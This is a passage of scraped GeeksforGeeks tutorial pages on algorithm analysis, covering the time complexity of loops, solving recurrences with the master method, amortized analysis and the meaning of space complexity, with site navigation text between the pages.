is O(1). // Here c is a constant for (int i = 1; i <= c; i++) { // some O(1) expressions } 2) O(n): Time Complexity of a loop is considered as O(n) if the loop variables is incremented / decremented by a constant amount. For example following functions have O(n) time complexity. // Here c is a positive integer constant for (int i = 1; i <= n; i += c) { // some O(1) expressions } for (int i = n; i > 0; i -= c) { // some O(1) expressions } 3) O(nc): Time complexity of nested loops is equal to the number of times the innermost statement is executed. For example the following sample loops have O(n2) time complexity for (int i = 1; i <=n; i += c) { for (int j = 1; j <=n; j += c) { // some O(1) expressions } } for (int i = n; i > 0; i -= c) { for (int j = i+1; j <=n; j += c) { // some O(1) expressions } For example Selection sort and Insertion Sort have O(n2) time complexity. 4) O(Logn) Time Complexity of a loop is considered as O(Logn) if the loop variables is divided / multiplied by a constant amount. for (int i = 1; i <=n; i *= c) { // some O(1) expressions } for (int i = n; i > 0; i /= c) { // some O(1) expressions } For example Binary Search(refer iterative implementation) has O(Logn) time complexity. Let us see mathematically how it is O(Log n). The series that we get in first loop is 1, c, c2, c3, … ck. If we put k equals to Logcn, we get cLogcn which is n. 5) O(LogLogn) Time Complexity of a loop is considered as O(LogLogn) if the loop variables is reduced / increased exponentially by a constant amount. // Here c is a constant greater than 1 for (int i = 2; i <=n; i = pow(i, c)) { // some O(1) expressions } //Here fun is sqrt or cuberoot or any other constant root for (int i = n; i > 1; i = fun(i)) { // some O(1) expressions } See this for mathematical details. How to combine time complexities of consecutive loops? When there are consecutive loops, we calculate time complexity as sum of time complexities of individual loops. for (int i = 1; i <=m; i += c) { // some O(1) expressions } for (int i = 1; i <=n; i += c) { // some O(1) expressions } Time complexity of above code is O(m) + O(n) which is O(m+n) If m == n, the time complexity becomes O(2n) which is O(n). How to calculate time complexity when there are many if, else statements inside loops? As discussed here, worst case time complexity is the most useful among best, average and worst. Therefore we need to consider worst case. We evaluate the situation when values in if-else conditions cause maximum number of statements to be executed. For example consider the linear search function where we consider the case when element is present at the end or not present at all. When the code is too complex to consider all if-else cases, we can get an upper bound by ignoring if else and other complex control statements. How to calculate time complexity of recursive functions? Time complexity of a recursive function can be written as a mathematical recurrence relation. To calculate time complexity, we must know how to solve recurrences. We will soon be discussing recurrence solving techniques as a separate post. Quiz on Analysis of Algorithms Next – Analysis of Algorithm | Set 4 (Solving Recurrences) Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Performance of loops (A caching question)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithms | Recurrences | Set 1 Article Tags : AnalysisArticles thumb_up 109 To-do Done 1.5 Based on 216 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Analysis of Algorithms | Set 3 (Asymptotic Notations) Next last_page Analysis of Algorithm | Set 4 (Solving Recurrences) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemComplexity Analysis of Binary SearchPractice Questions on Time Complexity AnalysisTime complexity of recursive Fibonacci program Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithm | Set 4 (Solving Recurrences) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Complexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple Examples Analysis of Algorithm | Set 4 (Solving Recurrences) Last Updated: 22-04-2020 In the previous post, we discussed analysis of loops. Many algorithms are recursive in nature. When we analyze them, we get a recurrence relation for time complexity. We get running time on an input of size n as a function of n and the running time on inputs of smaller sizes. For example in Merge Sort, to sort a given array, we divide it in two halves and recursively repeat the process for the two halves. Finally we merge the results. Time complexity of Merge Sort can be written as T(n) = 2T(n/2) + cn. There are many other algorithms like Binary Search, Tower of Hanoi, etc. There are mainly three ways for solving recurrences. 1) Substitution Method: We make a guess for the solution and then we use mathematical induction to prove the guess is correct or incorrect. For example consider the recurrence T(n) = 2T(n/2) + n We guess the solution as T(n) = O(nLogn). Now we use induction to prove our guess. We need to prove that T(n) <= cnLogn. We can assume that it is true for values smaller than n. T(n) = 2T(n/2) + n <= 2cn/2Log(n/2) + n = cnLogn - cnLog2 + n = cnLogn - cn + n <= cnLogn 2) Recurrence Tree Method: In this method, we draw a recurrence tree and calculate the time taken by every level of tree. Finally, we sum the work done at all levels. To draw the recurrence tree, we start from the given recurrence and keep drawing till we find a pattern among levels. The pattern is typically a arithmetic or geometric series. For example consider the recurrence relation T(n) = T(n/4) + T(n/2) + cn2 cn2 / \ T(n/4) T(n/2) If we further break down the expression T(n/4) and T(n/2), we get following recursion tree. cn2 / \ c(n2)/16 c(n2)/4 / \ / \ T(n/16) T(n/8) T(n/8) T(n/4) Breaking down further gives us following cn2 / \ c(n2)/16 c(n2)/4 / \ / \ c(n2)/256 c(n2)/64 c(n2)/64 c(n2)/16 / \ / \ / \ / \ To know the value of T(n), we need to calculate sum of tree nodes level by level. If we sum the above tree level by level, we get the following series T(n) = c(n^2 + 5(n^2)/16 + 25(n^2)/256) + .... The above series is geometrical progression with ratio 5/16. To get an upper bound, we can sum the infinite series. We get the sum as (n2)/(1 - 5/16) which is O(n2) 3) Master Method: Master Method is a direct way to get the solution. The master method works only for following type of recurrences or for recurrences that can be transformed to following type. T(n) = aT(n/b) + f(n) where a >= 1 and b > 1 There are following three cases: 1. If f(n) = Θ(nc) where c < Logba then T(n) = Θ(nLogba) 2. If f(n) = Θ(nc) where c = Logba then T(n) = Θ(ncLog n) 3.If f(n) = Θ(nc) where c > Logba then T(n) = Θ(f(n)) How does this work? Master method is mainly derived from recurrence tree method. If we draw recurrence tree of T(n) = aT(n/b) + f(n), we can see that the work done at root is f(n) and work done at all leaves is Θ(nc) where c is Logba. And the height of recurrence tree is Logbn In recurrence tree method, we calculate total work done. If the work done at leaves is polynomially more, then leaves are the dominant part, and our result becomes the work done at leaves (Case 1). If work done at leaves and root is asymptotically same, then our result becomes height multiplied by work done at any level (Case 2). If work done at root is asymptotically more, then our result becomes work done at root (Case 3). Examples of some standard algorithms whose time complexity can be evaluated using Master Method Merge Sort: T(n) = 2T(n/2) + Θ(n). It falls in case 2 as c is 1 and Logba] is also 1. So the solution is Θ(n Logn) Binary Search: T(n) = T(n/2) + Θ(1). It also falls in case 2 as c is 0 and Logba is also 0. So the solution is Θ(Logn) Notes: 1) It is not necessary that a recurrence of the form T(n) = aT(n/b) + f(n) can be solved using Master Theorem. The given three cases have some gaps between them. For example, the recurrence T(n) = 2T(n/2) + n/Logn cannot be solved using master method. 2) Case 2 can be extended for f(n) = Θ(ncLogkn) If f(n) = Θ(ncLogkn) for some constant k >= 0 and c = Logba, then T(n) = Θ(ncLogk+1n) Practice Problems and Solutions on Master Theorem. Next – Analysis of Algorithm | Set 5 (Amortized Analysis Introduction) References: http://en.wikipedia.org/wiki/Master_theorem MIT Video Lecture on Asymptotic Notation | Recurrences | Substitution, Master Method Introduction to Algorithms 3rd Edition by Clifford Stein, Thomas H. Cormen, Charles E. Leiserson, Ronald L. Rivest Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Algorithms | Recurrences | Set 1Algorithms Sample Questions | Recurrences | Set 2Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Master Theorem For Subtract and Conquer RecurrencesAdvanced master theorem for divide and conquer recurrencesAnalysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsPractice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisImproved By : Manish Dhanuka, animagussirius7 Article Tags : Analysis thumb_up 55 To-do Done 2.8 Based on 196 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Analysis of Algorithms | Set 4 (Analysis of Loops) Next last_page Tail Recursion Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary SearchCyclomatic Complexity More related articles in Analysis Analysis of Algorithms | Set 5 (Practice Problems)Analysis of different sorting techniquesProof that SAT is NP CompleteTime complexity of recursive Fibonacci programAnalysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithm | Set 5 (Amortized Analysis Introduction) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Complexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple Examples Analysis of Algorithm | Set 5 (Amortized Analysis Introduction) Last Updated: 24-04-2020 Amortized Analysis is used for algorithms where an occasional operation is very slow, but most of the other operations are faster. In Amortized Analysis, we analyze a sequence of operations and guarantee a worst case average time which is lower than the worst case time of a particular expensive operation. The example data structures whose operations are analyzed using Amortized Analysis are Hash Tables, Disjoint Sets and Splay Trees. Let us consider an example of a simple hash table insertions. How do we decide table size? There is a trade-off between space and time, if we make hash-table size big, search time becomes fast, but space required becomes high. The solution to this trade-off problem is to use Dynamic Table (or Arrays). The idea is to increase size of table whenever it becomes full. Following are the steps to follow when table becomes full. 1) Allocate memory for a larger table of size, typically twice the old table. 2) Copy the contents of old table to new table. 3) Free the old table. If the table has space available, we simply insert new item in available space. What is the time complexity of n insertions using the above scheme? If we use simple analysis, the worst case cost of an insertion is O(n). Therefore, worst case cost of n inserts is n * O(n) which is O(n2). This analysis gives an upper bound, but not a tight upper bound for n insertions as all insertions don’t take Θ(n) time. So using Amortized Analysis, we could prove that the Dynamic Table scheme has O(1) insertion time which is a great result used in hashing. Also, the concept of dynamic table is used in vectors in C++, ArrayList in Java. Following are few important notes. 1) Amortized cost of a sequence of operations can be seen as expenses of a salaried person. The average monthly expense of the person is less than or equal to the salary, but the person can spend more money in a particular month by buying a car or something. In other months, he or she saves money for the expensive month. 2) The above Amortized Analysis done for Dynamic Array example is called Aggregate Method. There are two more powerful ways to do Amortized analysis called Accounting Method and Potential Method. We will be discussing the other two methods in separate posts. 3) The amortized analysis doesn’t involve probability. There is also another different notion of average-case running time where algorithms use randomization to make them faster and expected running time is faster than the worst-case running time. These algorithms are analyzed using Randomized Analysis. Examples of these algorithms are Randomized Quick Sort, Quick Select and Hashing. We will soon be covering Randomized analysis in a different post. Amortized analysis of insertion in Red-Black Tree Let us discuss the Amortized Analysis of Red-Black Tree operations (Insertion) using Potential Method. To perform the amortized analysis of Red-Black Tree Insertion operation, we use Potential(or Physicist’s) method. For potential method, we define a potential function that maps a data structure to a non-negative real value. An operation can result in a change of this potential. Let us define the potential function in the following manner: (1) where n is a node of Red-Black Tree Potential function = ,over all nodes of the red black tree. Further, we define the amortized time of an operation as: Amortized time= c + (h) (h)= (h’) – (h) where h and h’ are the states of Red-Black Tree before and after the operation respectively c is the actual cost of the operation The change in potential should be positive for low-cost operations and negative for high-cost operations. A new node is inserted on a leaf of a red-black tree. We have the leaves of a red-black tree of any one of the following types: The insertions and their amortized analysis can be represented as: (1) This insertion is performed by first recolouring the parent and the other sibling(red). Then the grandparent and uncle of that leaf node is considered for further recolouring which leads to the amortized cost to be -1(when grandparent of the leaf node is red), -2 (when uncle of the leaf is black and grandparent is black) or +1 (when uncle of the leaf is red and grandparent is black). The insertion can be shown as: (2) In this insertion, the node is inserted without any changes as the black depth of the leaves remain the same. This is the case when leaf may have a black sibling or do not have any sibling (since we consider the colour of the colour of null node to be black). So, the amortized cost of this insertion is 0. (3) In this insertion, we cannot recolour the leaf node, its parent and the sibling such that the black depth stays the same as before. So, we need to perform a Left- Left rotation. After rotation, there are no changes when the grandparent of g(the inserted node) is black. Also, for the case of Red Grandparent of g(the inserted node), we do not have any changes. So, the insertion is completed with amortized cost= +2. The insertion has been depicted below: After calculating these particular amortized costs at the leaf site of a red-black tree we can discuss the nature of total amortized cost of insertion in a red-black tree. Since this may happen that two red nodes may have a parent-child relationship till the root of the red-black tree. So in extreme(or corner) case, we reduce the number of black nodes with two red children by 1 and we at most increase the number of black nodes with no red children by 1, leaving a net loss of at most 1 to the potential function. Since one unit of potential pays for each operation therefore (h) n where n is total number of nodes Thus, the total amortized cost of insertion in Red-Black Tree is O(n). For any doubts regarding insertions in red black tree, you may refer Insertions in Red-Black Tree. Sources: Berkeley Lecture 35: Amortized Analysis MIT Lecture 13: Amortized Algorithms, Table Doubling, Potential Method http://www.cs.cornell.edu/courses/cs3110/2011sp/lectures/lec20-amortized/amortized.htm http://web.iitd.ac.in/~csz188551/COL106_2019/ Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Amortized analysis for increment in counterAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsPractice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Complexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithm Practice Question for Beginners | Set 1NP-Completeness | Set 1 (Introduction)Improved By : ashwinikumar43215 Article Tags : Analysis thumb_up 37 To-do Done 2.6 Based on 119 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Tail Recursion Next last_page Algorithm Practice Question for Beginners | Set 1 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary SearchCyclomatic Complexity More related articles in Analysis Analysis of Algorithms | Set 5 (Practice Problems)Analysis of different sorting techniquesProof that SAT is NP CompleteTime complexity of recursive Fibonacci programAnalysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

What does 'Space Complexity' mean? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Understanding Time Complexity with Simple ExamplesComplexity of different operations in Binary tree, Binary Search Tree and AVL tree What does ‘Space Complexity’ mean? Last Updated: 30-10-2015 Space Complexity: The term Space Complexity is misused for Auxiliary Space at many places. Following are the correct definitions of Auxiliary Space and Space Complexity. Auxiliary Space is the extra space or temporary space used by an algorithm. Space Complexity of an algorithm is total space taken by the algorithm with respect to the input size. Space complexity includes both Auxiliary space and space used by input. For example, if we want to compare standard sorting algorithms on the basis of space, then Auxiliary Space would be a better criteria than Space Complexity. Merge Sort uses O(n) auxiliary space, Insertion sort and Heap Sort use O(1) auxiliary space. Space complexity of all these sorting algorithms is O(n) though. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Examples of Big-O analysisThe Slowest Sorting AlgorithmsSubset Sum is NP CompleteTime-Space Trade-Off in AlgorithmsOptimized Longest Path is NP CompleteProof that 4 SAT is NP completeProof that Collinearity Problem is NP CompleteSubset Equality is NP CompleteProof that SAT is NP CompleteDouble SAT is NP CompleteHitting Set problem is NP CompleteSet cover is NP Complete3-coloring is NP CompleteSet partition is NP complete Article Tags : Analysis thumb_up 66 To-do Done 1.5 Based on 170 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Time Complexity of building a heap Next last_page A Time Complexity Question Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary SearchCyclomatic Complexity More related articles in Analysis Analysis of Algorithms | Set 5 (Practice Problems)Analysis of different sorting techniquesProof that SAT is NP CompleteTime complexity of recursive Fibonacci programAnalysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Pseudo-polynomial Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram 